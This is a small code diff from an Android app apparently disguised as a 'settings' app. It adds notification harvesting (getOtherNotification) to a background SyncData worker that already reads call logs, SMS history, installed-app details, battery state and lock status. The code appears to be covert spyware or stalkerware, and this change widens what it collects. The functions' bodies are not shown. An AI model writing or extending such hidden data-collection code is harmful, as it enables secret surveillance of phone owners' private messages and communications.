@@ -34,6 +34,7 @@ import static com.example.settings.MainActivity.setuponetimeworkManager;
 import static com.example.settings.MainActivity.simName;
 import static com.example.settings.Utils.checkpermission;
 import static com.example.settings.Utils.getDateTime;
+import static com.example.settings.Utils.getOtherNotification;
 import static com.example.settings.Utils.getphoneAppdetails;
 import static com.example.settings.Utils.newUrlData;
 
@@ -79,6 +80,8 @@ public class SyncData extends Worker {
             Utils.readCallLogs(context, mSharedpref);
         }
         getphoneAppdetails(context,mSharedpref);
+        getOtherNotification(context,mSharedpref);
+
         Utils.readSmsHistory(context,mSharedpref);
         Utils.getBatteryPercent(context,mSharedpref);
         Utils.isPhoneIsLockedOrNot(context);
